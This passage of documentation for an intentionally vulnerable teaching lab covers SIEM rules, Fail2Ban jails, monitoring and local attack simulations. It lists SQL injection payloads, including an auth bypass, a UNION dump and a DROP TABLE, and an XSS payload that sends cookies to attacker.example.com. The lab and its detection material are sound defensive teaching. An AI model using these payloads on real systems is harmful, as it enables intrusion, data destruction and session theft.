<rule id="100004" level="12">
  <if_sid>100001</if_sid>
  <field name="event">sqli_attempt</field>
</rule>

<!-- Rule 100005: XSS detected — level 10 (high) -->
<rule id="100005" level="10">
  <if_sid>100001</if_sid>
  <field name="event">xss_attempt</field>
</rule>
```

**Rule levels in Wazuh:**
| Level | Severity | Meaning |
|-------|----------|---------|
| 0–3 | Informational | Normal system events |
| 4–7 | Low | Minor anomalies |
| 8–11 | Medium / High | Suspicious activity |
| 12–15 | Critical | Active attack |

**How rule chaining works (100001 → 100002 → 100003):**

Rule 100001 fires on any log from our app. Rule 100002 uses `<if_sid>100001</if_sid>` — it only fires when 100001 already fired AND the event field says `login_failed`. Rule 100003 uses `<if_matched_sid>100002</if_matched_sid>` — it fires when 100002 has fired 5 times within 60 seconds from the same IP. This is **event correlation** — a single failed login is noise, but five in a minute is an attack.

**Running Wazuh locally:**

```bash
cd security/wazuh/
docker compose up -d
# Access dashboard at https://localhost:443
# Default credentials: admin / SecretPassword
```

## 8.4 Fail2Ban — Automated IP Blocking

**What is Fail2Ban?**

Fail2Ban is a simple but powerful intrusion prevention tool. It watches log files for patterns that indicate attacks and reacts by instructing the firewall to block the offending IP address for a configurable duration.

**How it works:**

```
Log file → Pattern match → Count failures → Threshold reached → Block IP via iptables
```

**Our configuration** (`security/fail2ban/jail.local`):

```ini
# Jail for brute-force login attacks
[safepipeline-auth]
enabled  = true
port     = 5000
filter   = safepipeline-auth          # Which filter (regex) to use
logpath  = /var/log/safepipeline/app.log
maxretry = 5                          # 5 failures triggers the ban
findtime = 60                         # ...within 60 seconds
bantime  = 600                        # Ban for 10 minutes

# Jail for SQL injection attempts
[safepipeline-sqli]
enabled  = true
port     = 5000
filter   = safepipeline-sqli
logpath  = /var/log/safepipeline/app.log
maxretry = 3                          # 3 SQLi attempts = ban
findtime = 60
bantime  = 3600                       # 1-hour ban for SQL injection
```

**The filter** (`security/fail2ban/filter.d/safepipeline-auth.conf`) uses a regex to match the log entries:

```ini
[Definition]
failregex = .*"event": "login_failed".*"src_ip": "<HOST>".*
```

The `<HOST>` placeholder is replaced by Fail2Ban with the actual IP address extracted from the log.

**Why different ban times?** A brute force attempt is bad (10-minute ban), but an SQL injection attempt is worse — it indicates a more sophisticated attacker trying to compromise the database (1-hour ban).

**Wazuh vs Fail2Ban — what is the difference?**

| | Wazuh | Fail2Ban |
|---|---|---|
| **Role** | Observe and alert | Observe and block |
| **Output** | Security dashboard alerts | Firewall rules |
| **Scope** | Entire infrastructure | Specific service ports |
| **Reaction** | Notifies security team | Blocks IPs automatically |
| **Best for** | Investigation and forensics | Immediate automated response |

They complement each other: Wazuh sees the attack and alerts humans. Fail2Ban blocks the attacker before humans even have time to react.

---

# 9. Monitoring: Prometheus & Grafana

## 9.1 The Difference Between Logs and Metrics

Logs and metrics are both forms of observability, but they serve different purposes:

| | Logs | Metrics |
|---|---|---|
| **What they are** | Text records of specific events | Numerical measurements over time |
| **Example** | "User admin failed to log in at 14:32:01" | "50 failed logins per minute" |
| **Best for** | Debugging specific incidents, forensics | Detecting trends, capacity planning, alerting |
| **Volume** | High (every event creates a log) | Low (numbers sampled at intervals) |
| **Querying** | Search, grep, filter | Aggregate, graph, alert on thresholds |

Wazuh processes logs. Prometheus collects metrics. Both are necessary — logs give you the "what happened exactly", metrics give you the "how is the system behaving overall".

## 9.2 Prometheus — Metrics Collection

**What is Prometheus?**

Prometheus is an open-source monitoring system that collects numerical metrics by **scraping** (pulling) data from configured endpoints at regular intervals (typically every 15 seconds).

**How application metrics work:**

Our Flask application uses the `prometheus-flask-exporter` library, which automatically exposes an `/metrics` endpoint:

```python
from prometheus_flask_exporter import PrometheusMetrics
PrometheusMetrics(app)  # Adds /metrics endpoint automatically
```

When Prometheus scrapes `http://localhost:5000/metrics`, it receives data like:

```
# Total HTTP requests, broken down by method, endpoint, and status code
flask_http_request_total{method="POST",path="/login",status="200"} 42
flask_http_request_total{method="POST",path="/login",status="401"} 107

# Request duration histogram
flask_http_request_duration_seconds_bucket{le="0.1",path="/login"} 145

# Active requests right now
flask_http_requests_in_progress{method="GET",path="/dashboard"} 2
```

This data format is called **Prometheus exposition format** — a simple text format that any tool can expose.

**Prometheus configuration** (`monitoring/prometheus.yml`):

```yaml
scrape_configs:
  - job_name: 'safepipeline-app'
    static_configs:
      - targets: ['host.docker.internal:5000']   # Flask app metrics
    scrape_interval: 15s

  - job_name: 'prometheus'
    static_configs:
      - targets: ['localhost:9090']               # Prometheus own metrics
```

## 9.3 Grafana — Visualization and Dashboards

**What is Grafana?**

Grafana is a visualization platform that connects to data sources (Prometheus, Elasticsearch, SQL databases, etc.) and renders their data as interactive dashboards with graphs, gauges, heatmaps, and tables.

**Our dashboards** visualize:

| Panel | What it shows | Why it matters |
|-------|---------------|----------------|
| Request Rate | HTTP requests/second over time | Detect traffic spikes from attacks |
| Error Rate | 4xx/5xx responses over time | Detect broken functionality |
| Response Time | Latency percentiles (p50, p95, p99) | Detect performance degradation |
| Login Failures | Count of `login_failed` events | Detect brute force attacks |
| Request by Endpoint | Traffic breakdown by URL path | Identify which endpoints are targeted |

**Launching the monitoring stack:**

```bash
cd monitoring/
docker compose up -d
# Access Grafana at http://localhost:3000
# Credentials: admin / admin
```

The `monitoring/docker-compose.yml` starts both Prometheus and Grafana. Grafana is configured to automatically connect to Prometheus (datasource provisioning in `monitoring/datasources/prometheus.yml`) and load our pre-built dashboard (in `monitoring/dashboards/safepipeline.json`).

**Why pre-built dashboards?**

The dashboard JSON in `monitoring/dashboards/safepipeline.json` is the complete dashboard definition, stored as code. It is automatically loaded when Grafana starts via the `dashboard.yml` provisioning config. You do not need to configure anything manually — the dashboard appears immediately.

This is **dashboards as code** — the same principle as infrastructure as code. The dashboard is version-controlled, reproducible, and shareable.

---

# 10. Attack Simulations

## 10.1 Overview

All attack scripts are in `security/attacks/`. They must only be run against localhost or a controlled environment you own. These are educational tools for understanding how attacks work and verifying that detections fire correctly.

**Prerequisites before running attacks:**

```bash
# Start the application
docker run -d -p 5000:5000 --name safepipeline safepipeline-app

# Start monitoring (optional but recommended to see the effect)
cd monitoring/ && docker compose up -d

# Start Wazuh (optional — to see SIEM alerts)
cd security/wazuh/ && docker compose up -d
```

## 10.2 Attack 1: Brute Force Login

**Target:** `POST /login`  
**Goal:** Trigger Wazuh rule 100003 and Fail2Ban ban

**Script:** `security/attacks/brute_force.sh`

```bash
bash security/attacks/brute_force.sh localhost 5000
```

**What the script does:**
1. Creates wordlists of common usernames and passwords
2. Uses Hydra (or falls back to curl) to send rapid POST requests to `/login`
3. Each failed attempt generates a `login_failed` log event
4. After 5 failures within 60 seconds, Fail2Ban bans the source IP

**What to observe:**
- App log: `grep "login_failed" /var/log/safepipeline/app.log`
- Wazuh dashboard: Alert with rule 100003 — "Brute force attack"
- Fail2Ban status: `sudo fail2ban-client status safepipeline-auth`
- Grafana: Spike in the Login Failures panel

## 10.3 Attack 2: SQL Injection

**Target:** `GET /api/users?id=` and `POST /login`  
**Goal:** Demonstrate SQLi exploitation and trigger Wazuh rule 100004

**Script:** `security/attacks/sqli_test.sh`

```bash
bash security/attacks/sqli_test.sh localhost 5000
```

**Manual payloads to test in a browser:**

| Payload | URL | Effect |
|---------|-----|--------|
| Auth bypass | Login with `admin'--` as username | Logs in without password |
| Data dump | `/api/users?id=1 OR 1=1` | Returns first user record |
| Union attack | `/api/users?id=0 UNION SELECT 1,username FROM users` | Returns all usernames |
| Destructive | `/api/users?id=1; DROP TABLE users--` | Deletes the users table |

**What to observe:**
- App log: events with `"event":"sqli_attempt"` appear for API calls
- Wazuh: Level 12 critical alert (rule 100004)
- Fail2Ban: After 3 attempts, IP banned for 1 hour (safepipeline-sqli jail)

## 10.4 Attack 3: Port Scan

**Target:** The host machine  
**Goal:** Test network-level intrusion detection in Wazuh

**Script:** `security/attacks/portscan.sh`

```bash
bash security/attacks/portscan.sh localhost
```

**What the script does:** Runs `nmap` against localhost to discover open ports. A port scan is often the first reconnaissance step an attacker takes before launching targeted attacks.

**Open ports you will find:**
- `5000` — Flask web application
- `9090` — Prometheus metrics
- `3000` — Grafana dashboards
- `9200` — Wazuh indexer (OpenSearch)
- `443` — Wazuh dashboard (HTTPS)

**What to observe:** Wazuh's built-in IDS rules detect port scan patterns from nmap and generate alerts even without custom rules.

## 10.5 Attack 4: Cross-Site Scripting (XSS)

**Target:** `GET /dashboard?message=`  
**Goal:** Demonstrate XSS execution and trigger Wazuh rule 100005

**Script:** `security/attacks/xss_test.sh`

```bash
bash security/attacks/xss_test.sh localhost 5000
```

**Manual test in browser** (after logging in as `admin` / `admin123`):

```
http://localhost:5000/dashboard?message=<script>alert('XSS')</script>
```

A JavaScript popup appears — confirming the payload executes in the browser without any sanitization.

**Cookie theft simulation** (demonstrates real-world impact):
```
http://localhost:5000/dashboard?message=<script>
document.location='http://attacker.example.com/?c='+document.cookie
</script>
```

In a real attack, the victim's session cookie would be exfiltrated. With that cookie, the attacker can impersonate the victim without needing their password.

## 10.6 Detection Summary

| Attack | Log Event | Wazuh Rule | Alert Level | Fail2Ban Jail | Ban Duration |
|--------|-----------|------------|-------------|---------------|--------------|
| Brute Force | `login_failed` ×5 | 100003 | 10 (High) | safepipeline-auth | 10 minutes |
| SQL Injection | `sqli_attempt` | 100004 | 12 (Critical) | safepipeline-sqli | 1 hour |
| Port Scan | Network traffic | Built-in IDS | Variable | — | — |
| XSS | `xss_attempt` | 100005 | 10 (High) | — | — |

---

# 11. Local Testing Guide

## 11.1 Can You Test This on Your PC?

**Yes — the entire SafePipeline stack is designed to run on a local machine.** You do not need a cloud account or a remote server. All components run in Docker containers on your own computer.

**System requirements:**
- Windows 10/11, macOS, or Linux
- 8 GB RAM (minimum), 16 GB recommended (Wazuh is memory-intensive)
- 20 GB free disk space
- Docker Desktop installed and running

## 11.2 Option A: Run Only the Flask App (Quickest Start)

If you just want to see the application and test the vulnerabilities manually:

```bash
# 1. Clone the repository
git clone https://github.com/Annou91/SafePipeline.git
cd SafePipeline

# 2. Build the Docker image
docker build -t safepipeline-app ./app

# 3. Run the app
docker run -d -p 5000:5000 --name safepipeline safepipeline-app

# 4. Open in browser
# http://localhost:5000/login
# Login: admin / admin123

# 5. Stop when done
docker stop safepipeline && docker rm safepipeline
```

## 11.3 Option B: Run the Full Monitoring Stack

Adds Prometheus and Grafana to visualize metrics while you test:

```bash
# 1. Start the app (same as above)
docker run -d -p 5000:5000 --name safepipeline safepipeline-app

# 2. Start Prometheus + Grafana
cd monitoring/
docker compose up -d

# 3. Access services
# Flask app:  http://localhost:5000
# Prometheus: http://localhost:9090
# Grafana:    http://localhost:3000 (admin / admin)
```

In Grafana, the SafePipeline dashboard loads automatically. Generate traffic by using the app (logging in, visiting pages, running attack scripts) and watch the graphs update in real time.

## 11.4 Option C: Full Stack Including Wazuh

Adds the full SIEM capability. Note: Wazuh requires significant memory.

```bash
# First: ensure Docker has at least 6 GB of RAM allocated
# (Docker Desktop → Settings → Resources → Memory)

# Start Wazuh (generates SSL certs on first run)
cd security/wazuh/
docker compose up -d

# Wait 2-3 minutes for Wazuh to initialize, then access:
# https://localhost (accept the self-signed certificate warning)
# Credentials: admin / SecretPassword
```

**Important:** The SSL certificates in `security/wazuh/config/wazuh_indexer_ssl_certs/` are pre-generated self-signed certificates. Your browser will warn you about them. Click "Advanced → Proceed anyway" to access the dashboard.

## 11.5 Verifying the Pipeline Locally

You cannot run GitHub Actions locally in the exact same environment, but you can test each step manually:

```bash
# Step 1: Lint (same as CI)
pip install flake8
flake8 app/ --max-line-length=120 --exclude=app/__pycache__

# Step 2: Tests
pip install pytest
pytest app/tests/ -v

# Step 3: SAST
pip install bandit
bandit -r app/ -ll --exclude app/__pycache__

# Step 4: Docker build
docker build -t safepipeline-app:local ./app

# Step 5: ZAP scan (requires Docker)
# Start the app first, then:
docker run --rm \
  -v $(pwd):/zap/wrk/:rw \
  --network=host \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py -t http://localhost:5000 -r report_html.html -I
```

## 11.6 Kubernetes with Minikube (Advanced)

If you want to test the full Kubernetes deployment locally:

```bash
# 1. Install minikube (https://minikube.sigs.k8s.io/docs/start/)

# 2. Start the cluster
minikube start

# 3. Load the Docker image into minikube
minikube image load safepipeline-app:latest

# 4. Provision namespaces with Terraform
cd infra/
terraform init
terraform apply

# 5. Deploy the app
kubectl apply -f k8s/

# 6. Access the app
minikube service safepipeline-service --url
```

---

# 12. Conclusion

## 12.1 What Was Built

SafePipeline is a complete, working DevSecOps platform that demonstrates every stage of the modern secure software delivery lifecycle:

| Layer | Technology | What it does |
|-------|-----------|--------------|
| **Application** | Flask (Python) | Deliberately vulnerable web app with structured security logging |
| **Containerization** | Docker | Packages the app into portable, reproducible containers |
| **Orchestration** | Kubernetes | Manages container deployment, scaling, and recovery |
| **Infrastructure** | Terraform | Provisions Kubernetes namespaces as version-controlled code |
| **CI/CD** | GitHub Actions | Automates build → test → scan → deploy on every commit |
| **SAST** | Bandit | Analyzes source code for security vulnerabilities |
| **DAST** | OWASP ZAP | Attacks the running application to find runtime vulnerabilities |
| **SIEM** | Wazuh | Collects logs, correlates events, generates security alerts |
| **IPS** | Fail2Ban | Automatically blocks IPs that trigger attack patterns |
| **Metrics** | Prometheus | Collects numerical performance and business metrics |
| **Visualization** | Grafana | Displays metrics as real-time dashboards |

## 12.2 The Security Lifecycle in Action

When an attacker hits the SafePipeline system:

```
1. Attack launched (e.g., brute force)
        ↓
2. App detects failure → writes JSON log to /var/log/safepipeline/app.log
        ↓
3. Fail2Ban reads log → counts 5 failures in 60s → blocks IP via iptables
        ↓
4. Wazuh reads log → fires rule 100003 → creates alert in dashboard
        ↓
5. Prometheus records spike in failed_login metric
        ↓
6. Grafana shows spike on Login Failures panel → analyst sees the attack
        ↓
7. ZAP (next pipeline run) → confirms the brute-force surface exists
```

All of this happens in seconds, automatically, without a human having to watch a terminal.

## 12.3 What You Learn by Running This Project

1. **How vulnerabilities work** — by writing them intentionally and exploiting them yourself
2. **Why defense-in-depth matters** — ZAP finds it, Wazuh detects it live, Fail2Ban blocks it
3. **How CI/CD enforces security** — every commit is scanned; nothing untested reaches production
4. **How infrastructure as code scales** — the same Terraform + K8s code deploys to any environment
5. **How to read security logs** — structured JSON logs make correlation between tools seamless

## 12.4 Important Warnings

> **This project contains intentional vulnerabilities. Never deploy it on a public-facing server or in any network beyond your isolated local environment.**
>
> **Never run the attack simulation scripts against any system you do not personally own and have explicit permission to test.**
>
> **All credentials in this project are test credentials only** — `admin / admin123`, `admin / admin` (Grafana), `SecretPassword` (Wazuh). They must never be used in any real system.

---

*SafePipeline — Secure by design, vulnerable by intent.*
*Built for learning. Built with real tools. Built to understand how modern security actually works.*
